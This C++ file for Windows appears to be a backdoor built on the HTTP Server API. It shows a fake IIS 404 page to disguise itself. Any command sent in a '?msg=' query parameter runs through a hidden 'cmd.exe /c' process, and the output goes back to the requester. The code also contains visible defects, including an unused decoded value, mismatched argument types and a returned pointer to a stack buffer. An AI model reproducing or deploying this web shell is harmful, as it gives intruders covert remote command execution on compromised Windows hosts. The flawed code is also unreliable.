#include "pch.h"
#include <iostream>

static inline bool is_base64(unsigned char c) {
  return (isalnum(c) || (c == '+') || (c == '/'));
}

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";


std::string base64_decode(std::string& encoded_string) {
	size_t in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i <4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]) & 0xff;

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i) {
		for (j = 0; j < i; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]) & 0xff;

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);

		for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
	}

	return ret;
}

char *ExeCmd(WCHAR *pszCmd)
{
	SECURITY_ATTRIBUTES sa;
	HANDLE hRead, hWrite;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return ("[!] CreatePipe failed.");
	}

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	WCHAR command[MAX_PATH];
	wsprintf(command, L"cmd.exe /c %ws", pszCmd);

	if (!CreateProcess(NULL, command, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
		return ("[!] CreateProcess failed.");

	CloseHandle(hWrite);

	char buffer[4096] = { 0 };

	DWORD bytesRead;
	char strText[32768] = { 0 };

	while (true)
	{
		if (ReadFile(hRead, buffer, 4096 - 1, &bytesRead, NULL) == NULL)
			break;
		sprintf_s(strText, "%s\r\n%s", strText, buffer);
		memset(buffer, 0, sizeof(buffer));

	}
	//	printf("%s\n", strText);
	return strText;
}

/* Macros */


#define INITIALIZE_HTTP_RESPONSE( resp, status, reason )    \
    do                                                      \
    {                                                       \
        RtlZeroMemory( (resp), sizeof(*(resp)) );           \
        (resp)->StatusCode = (status);                      \
        (resp)->pReason = (reason);                         \
        (resp)->ReasonLength = (USHORT) strlen(reason);     \
    } while (FALSE)

#define ADD_KNOWN_HEADER(Response, HeaderId, RawValue)               \
    do                                                               \
    {                                                                \
        (Response).Headers.KnownHeaders[(HeaderId)].pRawValue =      \
                                                          (RawValue);\
        (Response).Headers.KnownHeaders[(HeaderId)].RawValueLength = \
            (USHORT) strlen(RawValue);                               \
    } while(FALSE)

#define ALLOC_MEM(cb) HeapAlloc(GetProcessHeap(), 0, (cb))
#define FREE_MEM(ptr) HeapFree(GetProcessHeap(), 0, (ptr))


/* Utility Functions Prototypes */
DWORD DoReceiveRequests(IN HANDLE hReqQueue);

DWORD
SendHttpResponse(
	IN HANDLE        hReqQueue,
	IN PHTTP_REQUEST pRequest,
	IN USHORT        StatusCode,
	IN PSTR          pReason,
	IN PSTR          pEntity
);

int __cdecl wmain(int argc, wchar_t* argv[])
{
	ULONG ret = 0;
	HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_1;
	HANDLE hReqQueue = NULL;
	int urlAdded = 0;

	if (argc < 2)
	{
		wprintf(L"%ws : <URL1> [URL2] ... \n", argv[0]);
		return -1;
	}

	/* Initialize HTTP Server APIs */
	ret = HttpInitialize(HttpApiVersion, HTTP_INITIALIZE_SERVER, NULL);
	if (ret != NO_ERROR)
	{
		wprintf(L"HttpInitialize failed with %lu\n", ret);
		return ret;
	}

	/* Creating a request queue handle */
	ret = HttpCreateHttpHandle(&hReqQueue, 0);
	if (ret != NO_ERROR)
	{
		wprintf(L"HttpCreateHttpHandle failed with %lu\n", ret);
		goto CleanUp;
	}

	/* Registering the URLs to Listen On */
	for (int i = 1; i < argc; i++)
	{
		wprintf(L"Listening for requests on the following url : %s\n", argv[i]);

		ret = HttpAddUrl(hReqQueue, argv[i], NULL);
		if (ret != NO_ERROR)
		{
			wprintf(L"HttpAddUrl failed with %lu \n", ret);
			goto CleanUp;
		}
		else
		{
			urlAdded++;
		}
	}

	DoReceiveRequests(hReqQueue);

CleanUp:

	for (int i = 1; i < urlAdded; i++)
	{
		HttpRemoveUrl(hReqQueue, argv[i]);
	}

	if (hReqQueue)
	{
		CloseHandle(hReqQueue);
	}

	HttpTerminate(HTTP_INITIALIZE_SERVER, NULL);

	return ret;
}

DWORD DoReceiveRequests(
	IN HANDLE hReqQueue
)
{
	ULONG ReqBufLength = sizeof(HTTP_REQUEST) + 2048; // 2 KB buffer
	PCHAR pReqBuf = (PCHAR)ALLOC_MEM(ReqBufLength);
	PHTTP_REQUEST pReq;
	HTTP_REQUEST_ID reqId;
	ULONG res;
	DWORD bytesRead;

	if (pReqBuf == NULL)
	{
		return ERROR_NOT_ENOUGH_MEMORY;
	}

	pReq = (PHTTP_REQUEST)pReqBuf;

	HTTP_SET_NULL_ID(&reqId);

	for (;;)
	{
		RtlZeroMemory(pReq, ReqBufLength);
		res = HttpReceiveHttpRequest(hReqQueue, reqId, 0, pReq, ReqBufLength, &bytesRead, NULL);
		if (res == NO_ERROR)
		{
			switch (pReq->Verb)
			{

			case HttpVerbGET:
			{
				std::string htmlResponse = "\
					<!DOCTYPE html>                                                      \
					<html>																 \
					<head>																 \
					<title>Chat</title>												 \
					</head>															 \
					<body>																 \
					<h1>This is the HTTP Server API</h1>			 \
					<form action = \"\">													 \
					Enter your message : <input type = \"text\" name = \"msg\"><br>			 \
					<input type = \"submit\" value = \"Submit\">							 \
					</form>															 \
					</body>															 \
					</html>	\
					";

				if (pReq->CookedUrl.QueryStringLength == 0)
				{
					res = SendHttpResponse(
						hReqQueue,
						pReq,
						404,
						"Not Found",
						"<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"/>\r\n<title>404 - File or directory not found.</title>\r\n<style type=\"text/css\">\r\n<!--\r\nbody{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\r\nfieldset{padding:0 15px 10px 15px;} \r\nh1{font-size:2.4em;margin:0;color:#FFF;}\r\nh2{font-size:1.7em;margin:0;color:#CC0000;}\r\nh3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}\r\n#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:\"trebuchet MS\", Verdana, sans-serif;color:#FFF;\r\nbackground-color:#555555;}\r\n#content{margin:0 0 0 2%;position:relative;}\r\n.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}\r\n-->\r\n</style>\r\n</head>\r\n<body>\r\n<div id=\"header\"><h1>Server Error</h1></div>\r\n<div id=\"content\">\r\n <div class=\"content-container\"><fieldset>\r\n  <h2>404 - File or directory not found.</h2>\r\n  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>\r\n </fieldset></div>\r\n</div>\r\n</body>\r\n</html>\r\n"
					);
					wprintf(L"--> Set the Response to 404\n");
				}
				else

				{
					wprintf(L"Got a GET request for %ws\n", pReq->CookedUrl.pFullUrl);
					wprintf(L"Got a QUERY : %ws\n", pReq->CookedUrl.pQueryString);
					if (wcsncmp(pReq->CookedUrl.pQueryString, L"?msg=", 5) == 0)
					{
						WCHAR *QueryString = new WCHAR[pReq->CookedUrl.QueryStringLength - 1];
						wcsncpy_s(QueryString, wcslen(QueryString), pReq->CookedUrl.pQueryString + 5, wcslen(QueryString) - 1);
						wprintf(L"[*] QueryStringDecode:%ws\n", QueryString);
						std::string cmd_decode;
						cmd_decode = base64_decode(QueryString);
						char *data = ExeCmd(QueryString);
						res = SendHttpResponse(
							hReqQueue,
							pReq,
							200,
							"OK",
							data
						);


					}
				}

			} 
			break;

			default:
			{
				wprintf(L"Got an unknown request for %ws\n", pReq->CookedUrl.pFullUrl);
				res = SendHttpResponse(hReqQueue, pReq, 503, (PSTR)"Not Implemented", NULL);
			} break;

			}

			if (res != NO_ERROR)
			{
				break;
			}

			HTTP_SET_NULL_ID(&reqId); // Reset for next request
		}
		else if (res == ERROR_MORE_DATA)
		{
			reqId = pReq->RequestId;

			/* Free Old Buffer Allocate New Buffer */
			ReqBufLength = bytesRead;
			FREE_MEM(pReqBuf);
			pReqBuf = (PCHAR)ALLOC_MEM(ReqBufLength);
			if (pReqBuf == NULL)
			{
				res = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}

			pReq = (PHTTP_REQUEST)pReqBuf;
		}
		else if (res == ERROR_CONNECTION_INVALID && !HTTP_IS_NULL_ID(&reqId))
		{
			HTTP_SET_NULL_ID(&reqId);
		}
		else
		{
			break;
		}
	}

	if (pReqBuf)
	{
		FREE_MEM(pReqBuf);
	}

	return res;
}

DWORD
SendHttpResponse(
	IN HANDLE        hReqQueue,
	IN PHTTP_REQUEST pRequest,
	IN USHORT        StatusCode,
	IN PSTR          pReason,
	IN PSTR          pEntity
)
{
	HTTP_RESPONSE response;
	HTTP_DATA_CHUNK dataChunk;
	DWORD res;
	DWORD bytesSend;


	INITIALIZE_HTTP_RESPONSE(&response, StatusCode, pReason);

	ADD_KNOWN_HEADER(response, HttpHeaderContentType, "text/html");

	if (pEntity)
	{
		dataChunk.DataChunkType = HttpDataChunkFromMemory;
		dataChunk.FromMemory.pBuffer = pEntity;
		dataChunk.FromMemory.BufferLength = (ULONG)strlen(pEntity);
		response.EntityChunkCount = 1;
		response.pEntityChunks = &dataChunk;
	}

	res = HttpSendHttpResponse(hReqQueue, pRequest->RequestId, 0, &response, NULL, &bytesSend, NULL, 0, NULL, NULL);
	if (res != NO_ERROR)
	{
		wprintf(L"HttpSendHttpResponse failed with %lu\n", res);
	}

	return res;
}

